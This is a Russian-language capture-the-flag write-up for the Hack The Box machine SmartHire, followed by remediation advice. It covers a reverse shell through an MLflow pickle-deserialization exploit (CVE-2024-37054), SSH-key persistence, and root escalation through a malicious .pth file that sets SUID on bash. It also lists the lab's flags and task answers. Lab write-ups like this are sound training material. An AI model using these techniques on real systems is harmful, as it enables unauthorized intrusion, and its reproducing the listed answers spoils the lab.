# Отчёт по прохождению машины SmartHire (Hack The Box)

---

## Общая информация

| Параметр | Значение |
|----------|----------|
| **Имя машины** | SmartHire |
| **IP-адрес** | 10.129.245.215 |
| **ОС** | Linux (Ubuntu) |
| **Сложность** | Medium |
| **Дата прохождения** | 02.10.2026 |
| **User flag** | `4a19024f4316a8ce72531c4da8dce55a` |
| **Root flag** | `af09616f7b3245d3bd54af2a1933acaf` |
### Все ответы по задачам

| Task | Ответ |
|------|-------|
| 1 | 2 |
| 2 | `models.smarthire.htb` |
| 3 | `MLflow` |
| 4 | `CVE-2024-37054` |
| 5 | `pyfunc.load_model` |
| 6 | `company name` |
| 7 | `svcweb` |
| 8 | (User flag) |
| 9 | `site` |
| 10 | `.pth` |
| 11 | `plugins/dev` |
---

## 1. Разведка (Reconnaissance)

### 1.1 Сканирование портов

```bash
nmap -sC -sV -oA nmap/smarthire 10.129.245.215
```

**Результаты:**

| Порт | Состояние | Сервис | Версия |
|------|-----------|--------|--------|
| 22/tcp | open | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 80/tcp | open | HTTP | nginx 1.18.0 (Ubuntu) |

**Вывод:** На машине открыты только SSH и HTTP. Веб-сервер перенаправляет на `smarthire.htb`.

### 1.2 Настройка hosts

```bash
echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts
```

### 1.3 Веб-приложение

При переходе на `http://smarthire.htb/` обнаружено веб-приложение для найма с формами регистрации и входа.

---

## 2. Поиск виртуальных хостов

### 2.1 Фаззинг VHost

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://smarthire.htb \
     -H "Host: FUZZ.smarthire.htb" \
     -fs 0
```

**Найден:** `models.smarthire.htb`

### 2.2 Проверка MLflow

```bash
echo "10.129.245.215 models.smarthire.htb" | sudo tee -a /etc/hosts
curl -I http://models.smarthire.htb/
```

**Ответ:** `401 Unauthorized`, заголовок `WWW-Authenticate: Basic realm="mlflow"` — обнаружен **MLflow** (платформа для управления ML-моделями).

**Учётные данные по умолчанию:** `admin:password`

**Версия MLflow:** 2.14.1

---

## 3. Анализ уязвимости

### 3.1 CVE-2024-37054

| Параметр | Значение |
|----------|----------|
| **CVE** | CVE-2024-37054 |
| **CVSS** | 8.8 (High) |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **Затронутые версии** | MLflow 1.1.0 – 2.14.1 |
| **Уязвимая функция** | `_load_model_from_local_file` (в `sklearn/__init__.py`) |

**Суть уязвимости:** MLflow использует `pickle.load()` для десериализации файлов моделей без проверки. Злоумышленник может загрузить вредоносный pickle-объект, который выполнит произвольный код при загрузке модели.

### 3.2 Механизм эксплуатации

1. Аутентификация в MLflow (`admin:password`)
2. Создание вредоносного pickle-файла
3. Загрузка его через MLflow API (PUT-запрос)
4. Триггер загрузки модели через веб-приложение (`/predict`)

---

## 4. Эксплуатация (User)

### 4.1 Подготовка PoC

```bash
git clone https://github.com/jimmexploit/CVE-2024-37054-PoC.git
cd CVE-2024-37054-PoC
python3 -m venv venv
source venv/bin/activate
pip install requests mlflow cloudpickle
```

### 4.2 Запуск эксплойта

```bash
# Листенер
nc -lvnp 4444

# В другом терминале
python3 shell.py \
  --target http://smarthire.htb/ \
  --mlflow http://models.smarthire.htb/ \
  --lhost 10.10.15.244 \
  --lport 4444 \
  --atoz
```

**Результат:** Обратный шелл получен как пользователь **`svcweb`**.

### 4.3 Стабилизация доступа

```bash
# Генерация SSH-ключа
ssh-keygen -t ed25519 -C "SSH to svcweb" -f svcweb_key

# Добавление ключа через reverse shell
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINvBby0CuqR1V7/QLgjVE5wjg2H72h+FN2KumrKg+u8y SSH to svcweb" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Подключение:**
```bash
sudo ip link set dev tun0 mtu 1200
ssh -i svcweb_key svcweb@smarthire.htb
```

### 4.4 User flag

```bash
cat ~/user.txt
# 4a19024f4316a8ce72531c4da8dce55a
```

---

## 5. Повышение привилегий (Root)

### 5.1 Анализ sudo-правил

```bash
sudo -l
```

**Результат:**
```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

**Вывод:** `svcweb` может запускать `mlflowctl.py` от root без пароля.

### 5.2 Анализ уязвимого скрипта

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py
```

**Ключевой фрагмент:**
```python
import site
site.addsitedir(str(plugin_path))
```

**Проблема:** `site.addsitedir()` обрабатывает `.pth` файлы из указанных директорий, выполняя их содержимое.

### 5.3 Проверка прав на плагины

```bash
ls -ld /opt/tools/mlflow_ctl/plugins/*
id
```

**Результат:** Каталог `/opt/tools/mlflow_ctl/plugins/dev/` доступен для записи группе `devs`, в которой состоит `svcweb`.

### 5.4 Эксплуатация через .pth hijacking

```bash
#  Подмена легитимного плагина
cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'PYEOF'
import os
def check_status():
    os.system("chmod +s /bin/bash")
def restart():
    os.system("chmod +s /bin/bash")
PYEOF

# Создание вредоносного .pth файла
cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'PTH'
import os; os.system("chmod +s /bin/bash")
PTH

# Запуск скрипта от root
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

# Получение root-шелла
/bin/bash -p
id
# uid=1000(svcweb) gid=1000(svcweb) euid=0(root) egid=0(root) groups=0(root),...
```

### 5.5 Root flag

```bash
cat /root/root.txt
# af09616f7b3245d3bd54af2a1933acaf
```

---

## 6. Сводная таблица уязвимостей

| Этап | Уязвимость | CVE/CWE | Компонент |
|------|-----------|---------|-----------|
| User | Небезопасная десериализация pickle | CVE-2024-37054 / CWE-502 | MLflow 2.14.1 |
| Root | Sudo + .pth hijacking | CWE-284 (Improper Access Control) | mlflowctl.py + site.addsitedir() |

---

## 7. Рекомендации по устранению

### 7.1 Для MLflow (User)

1. **Обновить MLflow** до версии выше 2.14.1
2. **Использовать безопасные форматы** сериализации (например, `skops` вместо pickle)
3. **Ограничить доступ** к MLflow API (сильные пароли, RBAC)
4. **Изолировать MLflow** в отдельном контейнере с минимальными привилегиями

### 7.2 Для mlflowctl.py (Root)

1. **Убрать sudo-правило** или ограничить аргументы
2. **Проверять права** на директории плагинов перед `site.addsitedir()`
3. **Не использовать `site.addsitedir()`** для директорий, доступных для записи непривилегированным пользователям
4. **Использовать `secure_path`** и ограничить `PYTHONPATH`

---

## 8. Заключение

Машина SmartHire демонстрирует цепочку из двух уязвимостей:

1. **CVE-2024-37054** в MLflow позволяет получить первоначальный доступ через RCE
2. **Небезопасная конфигурация sudo** и **group-writable директория плагинов** позволяют повысить привилегии до root через `.pth` hijacking

Машина отлично подходит для отработки навыков:
- Разведки веб-приложений (vhost fuzzing)
- Эксплуатации CVE в ML-платформах
- Анализа sudo-правил и Python site-механизма
- Повышения привилегий через `.pth` файлы

---
Машина пройдена. GG! 👾
